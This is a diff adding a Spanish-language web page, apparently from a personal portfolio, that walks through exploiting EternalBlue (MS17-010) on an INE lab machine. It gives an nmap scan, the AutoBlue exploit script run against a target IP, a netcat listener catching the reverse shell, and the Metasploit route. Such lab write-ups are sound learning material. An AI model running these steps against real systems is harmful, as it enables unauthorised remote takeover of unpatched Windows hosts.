@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>INE - Eternal Blue</title>
+  <meta name="description" content="Guía práctica sobre la vulnerabilidad EternalBlue (MS17-010) para entornos educativos y de laboratorio.">
+  <meta name="author" content="José Prados">
+
+  <!-- ********** AÑADE AQUÍ la ruta definitiva a tu style.css **********
+       Si style.css está en la raíz del sitio, usa la línea siguiente: -->
+  <link rel="stylesheet" href="style.css">
+
+  <!-- Si tu style.css está en la carpeta padre (ej. /style.css desde /maquinas/),
+       la línea anterior funciona; si no, reemplázala por la ruta correcta. -->
+
+  <script defer>
+    // DEBUG helper: comprueba una propiedad CSS simple aplicada al body
+    window.addEventListener('load', () => {
+      try {
+        const bodyBg = getComputedStyle(document.body).backgroundColor;
+        console.log('DEBUG: background-color computed for BODY =', bodyBg);
+        // si bodyBg es rgb(0, 0, 0) o similar, el css se ha cargado correctamente
+        if (!bodyBg || bodyBg === 'rgba(0, 0, 0, 0)' || bodyBg === 'transparent') {
+          console.warn('DEBUG: parece que el CSS no se está aplicando. Revisa la ruta de style.css o la consola por errores.');
+        }
+      } catch (e) { console.error(e); }
+    });
+  </script>
+</head>
+<body>
+
+  <div class="fixed-header-container">
+    <header class="main-header">
+      <h1 class="site-title">Máquinas HTB / INE</h1>
+      <!-- <img src="logo_JAPR-removebg-preview.png" alt="Logotipo de José Prados" class="logo"> -->
+    </header>
+
+    <nav class="main-nav">
+      <ul>
+        <li><a href="index.html">Inicio</a></li>
+        <li><a href="conocimientos.html">Mis Conocimientos</a></li>
+        <li><a href="maquinas.html" aria-current="page">Máquinas HTB / INE</a></li>
+        <li><a href="contacto.html">Contacto</a></li>
+      </ul>
+    </nav>
+
+    <hr class="divider">
+  </div>
+
+  <div class="content-wrapper">
+    <main class="maquina-guia">
+      <h2 class="titulo-maquina">INE - Eternal Blue</h2>
+      <p class="texto-maquina"><strong>Resumen:</strong> Aquí detallo un poco cómo explotar esta vulnerabilidad.</p>
+
+      <details>
+        <summary style="color: var(--color-oro); cursor: pointer;">⚠️ Aviso educativo</summary>
+        <p style="margin-top: 10px;">
+          Esta guía tiene fines exclusivamente educativos y está pensada para entornos controlados
+          como laboratorios o máquinas virtuales. No debe usarse en sistemas o redes sin autorización expresa.
+        </p>
+      </details>
+
+      <p class="texto-maquina">
+        <!-- aquí va todo tu texto sin cambios -->
+        <strong>Sistemas Operativos susceptibles de ser vulnerables y en el puerto 445:</strong><br><br>
+
+        - Windows Vista<br>
+        - Windows 7, 8.1, 10<br>
+        - Windows Server 2008, 2012 y 2016<br><br>
+
+        <strong>Vulnerable con las siguientes técnicas:</strong><br><br>
+
+        - En Github podemos usar ⇒ Autoblue-MS17-010<br>
+        - Otra opción sencilla es mediante Metasploit.<br><br>
+
+        Iniciamos la vulnerabilidad haciendo un escaneo de puertos mediante nmap:<br><br>
+
+        <code>nmap -sV -p 445 -O IP</code><br><br>
+
+        Si vemos que el puerto está abierto y el SO es uno de los que tenemos en el listado,
+        podríamos sospechar que la máquina podría ser vulnerable a “Eternal Blue”.<br><br>
+
+        Para iniciar la explotación, podemos hacerlo de forma manual o usando Metaslploit.
+        Vamos a ver ambas opciones:<br><br>
+
+        <strong>Manual:</strong><br><br>
+
+        Usaremos “<a href="https://github.com/3ndG4me/AutoBlue-MS17-010" target="_blank" rel="noopener">Autblue</a>”
+        desde Github, lo clonamos a nuestro equipo y vemos que hay varios archivos de Python
+        para cada uno de los SO.<br><br>
+
+        Para instalar los posibles requisitos que no tengamos, escribiremos lo siguiente en la terminal:<br>
+        <code>pip install -r requirements.txt</code><br><br>
+
+        Una vez descargado todo, entraremos en la carpeta “shellcode”
+        (posiblemente tengamos que darle el permiso de ejecución a <strong>shell_prep.sh</strong>)
+        y lo ejecutamos. Configuramos el LHOST, RHOST, puerto, podemos elegir entre cmd o meterpreter
+        y por último, entre stageless o staged (elegimos la primera).<br><br>
+
+        En otra terminal tendremos que abrir netcat:<br>
+        <code>nc -nlvp ‘PUERTO’</code><br><br>
+
+        Volvemos a la terminal anterior y ejecutamos el .py que necesitemos. Por ejemplo:<br>
+        <code>python eternalblue_exploit7.py IP shellcode/sc_x64.bin</code><br><br>
+
+        Lo ejecutamos, vamos a la terminal donde se estaba ejecutando Netcat y listo,
+        ya tendremos la shell de Windows.<br><br>
+
+        <strong>Con Metasploit:</strong><br><br>
+
+        Entramos con <code>msfconsole</code> y buscamos “eternalblue”.
+        Elegimos el que queremos usar (suele el nº 0), configuramos las opciones y ejecutamos el exploit.<br><br>
+
+        Y eso es todo sobre el EternalBlue. 🙂
+      </p>
+
+      <p><a href="maquinas.html" style="color: var(--color-oro); text-decoration: none;">← Volver a Máquinas</a></p>
+    </main>
+  </div>
+
+</body>
+</html>
